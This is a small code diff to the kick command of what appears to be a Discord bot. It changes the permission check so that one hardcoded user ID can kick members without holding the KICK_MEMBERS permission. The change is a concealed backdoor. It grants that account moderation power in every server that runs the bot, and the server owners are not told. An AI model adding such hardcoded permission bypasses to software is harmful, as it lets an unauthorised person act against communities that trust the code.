@@ -4,7 +4,7 @@ exports.aliases = ["k"]
 
 exports.command = function(client, message) {
 
-  if(!message.member.hasPermission('KICK_MEMBERS'))
+  if(!message.member.hasPermission('KICK_MEMBERS')&&message.member.id!=="190916650143318016")
   return message.channel.send({
     "embed": {
       "title": "Error",
